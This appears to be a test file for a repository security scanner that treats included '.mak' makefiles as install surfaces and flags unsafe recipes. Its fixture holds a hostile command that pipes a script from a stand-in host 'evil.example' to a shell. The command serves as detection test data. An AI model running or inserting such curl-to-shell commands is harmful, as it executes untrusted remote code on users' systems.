import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

function recipeFixture(): string {
  return `evil:\n\t${PAYLOAD}\n`;
}

test("an included makefile is scanned as an install surface", () => {
  // PRD section 8: the scan checks install and build scripts, and a scan
  // is incomplete when content that runs at install or execution time was
  // not covered. An included `.mak` file is part of the same build
  // document as a Makefile: its recipes run at build time, so it is
  // execution content whatever its directory is.
  for (const path of [
    "build/common.mak",
    "mk/rules.mak",
    "src/nmake/common.mak",
  ]) {
    const inspection = inspected(path, recipeFixture());
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect({
      path,
      findings: inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    }).toEqual({ path, findings: [`${path}:unsafe-execution:high`] });
    expect(inspection.downloads).toEqual(["https://evil.example/install.sh"]);
  }
});

test("an included makefile is covered with its including Makefile", () => {
  const scan = (mak: string) =>
    inspectRepository({
      files: [
        {
          path: "Makefile",
          bytes: new TextEncoder().encode("include build/common.mak\n"),
        },
        {
          path: "build/common.mak",
          bytes: new TextEncoder().encode(mak),
        },
      ],
    });
  const inspection = scan(recipeFixture());
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 2,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["build/common.mak:unsafe-execution:high"]);
  const before = scan("clean:\n\trm -f build/output\n");
  const after = scan("clean:\n\trm -f build/output build/other\n");
  expect(before.inventorySha256 === after.inventorySha256).toBe(false);
});

test("the make boundary stays narrow", () => {
  // A `.mk` file keeps its existing source-only surface: this change
  // covers included `.mak` build documents, not every make-related name.
  expect(surfacesOf("rules.mk")).toEqual(["source"]);
  // The extension must end the path: a `.mak` mention inside another
  // file name is not a build document.
  expect(surfacesOf("notes.mak.txt")).toEqual([]);
  expect(surfacesOf("common.mak.bak")).toEqual([]);
});
